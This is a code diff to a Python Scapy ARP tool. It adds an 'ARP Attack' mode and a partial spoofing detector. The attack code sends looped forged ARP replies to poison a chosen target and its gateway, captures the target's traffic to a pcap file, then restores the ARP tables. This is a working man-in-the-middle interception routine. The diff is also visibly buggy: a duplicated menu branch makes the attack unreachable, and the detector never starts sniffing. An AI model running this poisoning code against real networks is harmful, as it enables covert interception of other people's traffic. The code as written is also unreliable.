@@ -1,9 +1,9 @@
 from scapy.all import *
-from scapy_http.http import *
-import struct
 import argparse  # Importing argument parser for commandline
 import re  # Importing regex
-
+from multiprocessing import Process
+import os, time, netifaces, sys, logging
+from sys import platform
 
 # A useful function that searches for a certain word in a string and returns it
 def findwholeword(arg):
@@ -47,7 +47,7 @@ def getargs():
                         default="200")
 
     parser.add_argument("-fn", "--filename", type=str, nargs=1,
-                        metavar='filename', default="Pom.pcap",
+                        metavar='filename', default="Pom",
                         help="Name of the file. Default: Data.pcap")
 
     parser.add_argument("-p", "--parsemode", type=str, nargs=1,
@@ -66,15 +66,14 @@ def getargs():
     return args  # Returns the args as a list so we can parse later
 
 
-def getpackets(livecapturearg, packetcountarg):
+def getpackets(livecapturearg, packetcountarg, filenamearg):
     if livecapturearg:  # If we're capturing data live..
         packets = sniff(count=packetcountarg, filter="ARP")  # sniff packets at the specified packetcount
-        wrpcap(filename, packets)  # Then write the data into the specified filename and the packets
+        wrpcap(filenamearg, packets)  # Then write the data into the specified filename and the packets
         return packets  # Return all the packets recieved just now
     else:
-        packets = rdpcap(filename)  # Read the packets from a specified file
+        packets = rdpcap(filenamearg)  # Read the packets from a specified file
         return packets  # Return the packets read from the file
-
 
 
 # Here is where the real action happens
@@ -132,9 +131,9 @@ def protocolcheck(packet, counter, verbosesetting):
 
 def arp_display(packet):
     if packet[ARP].op == 1:
-        return "[Request] {} is asking about {}".format(packet[ARP].psrc, packet[ARP].pdst)
+        return "[*] [Request] {} is asking about {}".format(packet[ARP].psrc, packet[ARP].pdst)
     elif packet[ARP].op == 2:
-        return "[Response] {} is at {}".format(packet[ARP].psrc, packet[ARP].hwsrc)
+        return "[*] [Response] {} is at {}".format(packet[ARP].psrc, packet[ARP].hwsrc)
 
 
 def gethwtype(packet):
@@ -192,30 +191,86 @@ def getsport(packet):
         return None
 
 
-def readpcap(pcapfilename):
-    pktlist = rdpcap(pcapfilename)
-    #  use dictionary to count the number of ARPs
-    dic = {}
-    for pack in pktlist:
-        #  check for ARP
-        if ARP in pack and pack[ARP].op in (1, 2):
-                pkt = pack[ARP]
-                pair = (pkt.psrc, pkt.pdst)
-                try:
-                    dic[pair] += 1
-                    #  try if this pair has occured in dictionary
-                except KeyError:
-                    #  create new one
-                    dic[pair] = 1
-    #  write csv:
-    with open('arps.csv', 'wb') as csvfile:
-        writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_NONNUMERIC)
-        writer.writerow(['source', 'target', 'value'])
-        #  output the dictionary
-        for pair in dic:
-            if dic[pair] > 1:
-                    writer.writerow([pair[0], pair[1], dic[pair]])
+def get_mac(ip_address):
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
 
+    # return the MAC address from a response
+    for s, r in responses:
+        return r[Ether].src
+    return None
+
+
+def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    # slightly different method using send
+    print("[*] Restoring target...")
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+
+
+def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    poison_target = ARP()
+    poison_target.op = 2
+    poison_target.psrc = gateway_ip
+    poison_target.pdst = target_ip
+    poison_target.hwdst = target_mac
+
+    poison_gateway = ARP()
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst = gateway_mac
+
+    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
+
+    while True:
+        try:
+            send(poison_target)
+            send(poison_gateway)
+
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+            break
+
+    print("[*] ARP poison attack finished.")
+    return
+
+
+def check_spoof(source, mac, destination):
+    # Function checks if a specific ARP reply is part of an ARP spoof attack or not
+    if destination == broadcast:
+        if not mac in replies_count:
+            replies_count[mac] = 0
+
+    if not source in requests and source != local_ip:
+        if not mac in replies_count:
+            replies_count[mac] = 0
+        else:
+            replies_count[mac] += 1
+        # Logs ARP Reply
+        print("ARP replies detected from MAC {}. Request count {}".format(mac, replies_count[mac]))
+
+        if (replies_count[mac] > request_threshold) and (not mac in notification_issued):
+            # Check number of replies reaches threshold or not, and whether or not we have sent a notification for this MAC addr
+            logging.error("ARP Spoofing Detected from MAC Address {}".format(mac)) # Logs the attack in the log file
+            # Issue OS Notification
+            # issue_os_notification("ARP Spoofing Detected", "The current network is being attacked.", "ARP Spoofing Attack Detected from {}.".format(mac))
+            # Add to sent list to prevent repeated notifications.
+            # notification_issued.append(mac)
+    else:
+        if source in requests:
+            requests.remove(source)
+
+def packet_filter (packet):
+    # Retrieve necessary parameters from packet
+    source = packet.sprintf("%ARP.psrc%")
+    dest = packet.sprintf("%ARP.pdst%")
+    source_mac = packet.sprintf("%ARP.hwsrc%")
+    operation = packet.sprintf("%ARP.op%")
+    if source == local_ip:
+        requests.append(dest)
+    if operation == 'is-at':
+        return check_spoof (source, source_mac, dest)
 
 livecapture = boolcleanup(getargs()['livecapture'])
 packetcount = int(textcleanup(getargs()['packetcount']))
@@ -225,64 +280,41 @@ verbose = boolcleanup(getargs()['verbose'])
 input_var = boolcleanup(getargs()['input'])
 
 
-def manualoverride(arg):
-    if arg:
-        return True
-    else:
-        return False
-
-
 # Main function, pretty much prints out the variable settings.
 def main():
     localpacketcount = packetcount
     localverbose = verbose
     localfilename = filename
+    interface = conf.iface
     while True:
-        print("Type the number for the option you want to choose")
-        print("1. ARP File Analysis")
-        print("2. ARP Live Analysis")
-        print("3. ARP Attack")
-        print("Type exit to quit the program")
-        decision = input()
+        print("[*] Type the number for the option you want to choose")
+        print("[1] ARP File Analysis")
+        print("[2] ARP Live Analysis")
+        print("[3] ARP Attack")
+        print("[4] ARP Spoofing Detector")
+
+        decision = input("[?] ")
         if decision == "Exit" or decision == "exit":
             exit()
 
         elif textcleanup(decision) == "1":
             print("########## ARP File Analysis ##########")
+            time.sleep(1)
             print()
+            time.sleep(1)
             print("########## Settings ##########")
             while True:
-                print("What is the filename of the pcap file? Default: " + str(localfilename) + " (Value: [Name].pcap)")
+                time.sleep(1)
+                print("What is the filename of the pcap file? Default: " + str(localfilename) + " (Value: [Name])")
                 filechoice = input()
 
-                if filenamecleanup(filechoice) == '':
-                    print("Using default filename: " + localfilename)
+                if filechoice == "":
+                    print("[*] Using default filename: " + localfilename)
                     break
                 else:
                     localfilename = filenamecleanup(filechoice)
-                    print("Filename has been set to " + localfilename)
+                    print("[*] Filename has been set to " + localfilename)
                     break
-
-        elif textcleanup(decision) == "2":
-            print("########## ARP Live Analysis ##########")
-            print()
-            print("########## Settings ##########")
-
-            # PACKET COUNT
-            print("How many packets should the program collect? Default: " + str(localpacketcount) + " (Value: [Number])")
-            while True:
-                numchoice = input()
-                try:
-                    if int(textcleanup(numchoice)) > 0:
-                        print("Setting packet count to " + str(numchoice))
-                        localpacketcount = numchoice
-                        break
-                except ValueError:
-                    print("Using default setting [Packet count: " + str(localpacketcount) + "]")
-                    break
-
-            # PARSE MODE
-            print()
             print("Enable simple packet analysis? Default: " + str(parsemode) + " (Value: [True/False])")
             temp = True
             while True:
@@ -291,50 +323,268 @@ def main():
                 else:
                     choice = str(parsemode)
                 if choice == "True" or choice == "true":
-                    print("Simple packet analysis is enabled")
+                    time.sleep(1)
+                    print("[*] Simple packet analysis is enabled")
                     while True:
+                        time.sleep(.5)
                         print()
-                        print("Enable verbose mode for simple packet analysis? Default: " + str(verbose) + " (Value: [True/False])")
+                        time.sleep(.5)
+                        print("Enable verbose mode for simple packet analysis? Default: " + str(
+                            verbose) + " (Value: [True/False])")
                         verbosechoice = input()
                         if textcleanup(verbosechoice) == "True" or verbosechoice == "true":
-                            print("Verbose mode has been enabled")
+                            time.sleep(1)
+                            print("[*] Verbose mode has been enabled")
                             localverbose = True
                             break
                         elif textcleanup(verbosechoice) == "False" or verbosechoice == "false":
-                            print("Verbose mode has been disabled")
+                            time.sleep(1)
+                            print("[*] Verbose mode has been disabled")
                             localverbose = False
                             break
                         else:
-                            print("Using default setting [Verbose mode: " + str(localverbose) + "]")
+                            time.sleep(1)
+                            print("[*] Using default setting [Verbose mode: " + str(localverbose) + "]")
                             break
-                    print("Scanning... This might take some time")
-                    parsepacket(getpackets(manualoverride(True), int(localpacketcount)), boolcleanup(localverbose))
+                    time.sleep(1)
+                    print("[*] Scanning... This might take some time")
+                    parsepacket(getpackets(False, None, localfilename), boolcleanup(localverbose))
+                    time.sleep(1)
                     print()
+                    time.sleep(1)
                     runagainchoice = input("Run again? Default: No (Value: [Yes/No])")
                     if runagainchoice == "Yes" or runagainchoice == "yes":
+                        print()
                         continue
                     else:
                         print()
                         break
+
                 elif choice == "False" or choice == "false":
-                    print("Simple packet analysis is disabled")
+                    time.sleep(1)
+                    print("[*] Simple packet analysis is disabled")
+                    time.sleep(1)
                     print()
-                    print("Scanning... This might take some time")
-                    filterpackets(getpackets(manualoverride(True), int(localpacketcount)))
+                    time.sleep(1)
+                    print("[*] Scanning... This might take some time")
+                    filterpackets(getpackets(False, None, localfilename))
+                    time.sleep(1)
                     print()
+                    time.sleep(1)
                     runagainchoice = input("Run again? Default: No (Value: [Yes/No])")
                     if runagainchoice == "Yes" or runagainchoice == "yes":
+                        print()
                         continue
                     else:
                         print()
                         break
                 else:
-                    print("Using default setting [Parse Mode: " + str(parsemode) + "]")
+                    print("[*] Using default setting [Parse Mode: " + str(parsemode) + "]")
                     temp = False
                     continue
+
+        elif textcleanup(decision) == "2":
+            print()
+            time.sleep(1)
+            print("########## ARP Live Analysis ##########")
+            print()
+            time.sleep(1)
+            print("########## Settings ##########")
+            while True:
+                time.sleep(1)
+                print("What is the filename of the pcap file? Default: " + str(localfilename) + " (Value: [Name])")
+                filechoice = input()
+
+                if filechoice == "":
+                    print("[*] Using default filename: " + localfilename)
+                    break
+                else:
+                    localfilename = filenamecleanup(filechoice)
+                    print("[*] Filename has been set to " + localfilename)
+                    break
+            # PACKET COUNT
+            time.sleep(1)
+            print()
+            time.sleep(1)
+            print("[?] How many packets should the program collect? Default: " + str(localpacketcount))
+            numchoice = input()
+            try:
+                if int(textcleanup(numchoice)) > 0:
+                    print("[*] Setting packet count to " + str(numchoice))
+                    localpacketcount = numchoice
+            except ValueError:
+                print("[*] Using default setting [Packet count: " + str(localpacketcount) + "]")
+
+            # PARSE MODE
+            time.sleep(.5)
+            print()
+            time.sleep(.5)
+            print("[?] Enable simple packet analysis? Default: " + str(parsemode) + " (Value: [True/False])")
+            temp = True
+            while True:
+                if temp:
+                    choice = input()
+                else:
+                    choice = str(parsemode)
+                if choice == "True" or choice == "true":
+                    print("[*] Simple packet analysis is enabled")
+                    print()
+                    print("[?] Enable verbose mode for simple packet analysis? Default: " + str(verbose) + " (Value: [True/False])")
+                    verbosechoice = input()
+                    if textcleanup(verbosechoice) == "True" or verbosechoice == "true":
+                        print("[*] Verbose mode has been enabled")
+                        localverbose = True
+                    elif textcleanup(verbosechoice) == "False" or verbosechoice == "false":
+                        print("[*] Verbose mode has been disabled")
+                        localverbose = False
+                    else:
+                        print("[*] Using default setting [Verbose mode: " + str(localverbose) + "]")
+
+                    time.sleep(1)
+                    print()
+                    time.sleep(1)
+                    print("[*] Scanning... This might take some time")
+                    parsepacket(getpackets(True, int(localpacketcount), localfilename), boolcleanup(localverbose))
+
+                    print()
+                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
+                    if runagainchoice == "Yes" or runagainchoice == "yes":
+                        print()
+                        continue
+                    else:
+                        print()
+                        break
+
+                elif choice == "False" or choice == "false":
+                    print("[*] Simple packet analysis is disabled")
+
+                    print()
+                    print("[*] Scanning... This might take some time")
+                    filterpackets(getpackets(True, int(localpacketcount), None))
+
+                    print()
+                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
+                    if runagainchoice == "Yes" or runagainchoice == "yes":
+                        print()
+                        continue
+                    else:
+                        print()
+                        break
+                else:
+                    print("[*] Using default setting [Parse Mode: " + str(parsemode) + "]")
+                    temp = False
+                    continue
+
+        elif textcleanup(decision) == "2":
+            while True:
+                print()
+                print("[Windows] You can type ipconfig in command prompt to get the IPs required")
+                target_ip = input("[?] Target IP: ")
+                gateway_ip = input("[?] Gateway IP: ")
+
+                print(("[*] Setting up %s" % interface))
+
+                gateway_mac = get_mac(gateway_ip)
+
+                if gateway_mac is None:
+                    print("[!!!] Failed to get gateway MAC. Exiting")
+                    time.sleep(3)
+                    break
+                else:
+                    print(("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)))
+
+                target_mac = get_mac(target_ip)
+
+                if target_mac is None:
+                    print("[!!!] Failed to get target MAC. Exiting")
+                    time.sleep(3)
+                    break
+                else:
+                    print(("[*] Target %s is at %s" % (target_ip, target_mac)))
+
+                time.sleep(2)
+                print()
+                print("[?] How many packets should the program collect? Default: " + str(
+                    localpacketcount))
+
+                numchoice = input()
+                try:
+                    if int(textcleanup(numchoice)) > 0:
+                        print("[*] Setting packet count to " + str(numchoice))
+                        localpacketcount = numchoice
+                except ValueError:
+                    print("[*] Using default setting [Packet count: " + str(localpacketcount) + "]")
+
+                time.sleep(1)
+                print()
+                time.sleep(1)
+                print("[?] What is the filename of the pcap file? Default: " + str(
+                    localfilename) + " (Value: [Name] + .pcap)")
+                filechoice = input()
+
+                if filechoice == "":
+                    print("[*] Using default filename: " + localfilename)
+                else:
+                    localfilename = filenamecleanup(filechoice)
+                    print("[*] Filename has been set to " + localfilename)
+
+                # start poison thread
+                poison_thread = Process(target=poison_target,
+                                                 args=(gateway_ip, gateway_mac, target_ip, target_mac))
+                poison_thread.start()
+
+                try:
+                    print(("[*] Starting sniffer for %d packets" % int(localpacketcount)))
+                    bpf_filter = "ip host %s" % target_ip
+                    packets = sniff(count=int(localpacketcount), filter=bpf_filter, iface=interface)
+                    poison_thread.terminate()
+
+                    # write out the captured packets
+                    print("[*] Writing captured packets to " + localfilename)
+                    wrpcap(localfilename, packets)
+
+                    # restore the network
+                    print("[*] Restoring network")
+                    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+                    print()
+                    print("[!] Attack successfully completed. Data is saved in " + localfilename)
+                    print()
+
+                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
+                    if runagainchoice == "Yes" or runagainchoice == "yes":
+                        print()
+                        continue
+                    else:
+                        print()
+                        break
+
+                except KeyboardInterrupt:
+                    # restore the network
+                    print("[!!!] Keyboard activity detected, restoring network")
+                    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+                    time.sleep(2)
+                    break
         else:
-            print("Coming soon")
-            break
+            while True:
+                # Number of ARP replies received from a specific mac before flagging it
+                request_threshold = 10
+
+                # Retrieve network addresses (IP, broadcast) from the network interfaces
+                addrs = netifaces.ifaddresses(interface)
+
+                print("[*] Retrieving addresses and broadcasts on interface...")
+                try:
+                    local_ip = addrs[netifaces.AF_INET][0]["addr"]
+                    broadcast = addrs[netifaces.AF_INET][0]["broadcast"]
+                except KeyError:
+                    print("[!] Cannot read address/broadcast address on interface {}".format(interface))
+                    time.sleep(2)
+                    break
+
+                requests = []
+                replies_count = {}
+
+                print("ARP Spoofing Scan has begun on {}".format(local_ip))
 
 
 # Runs the main
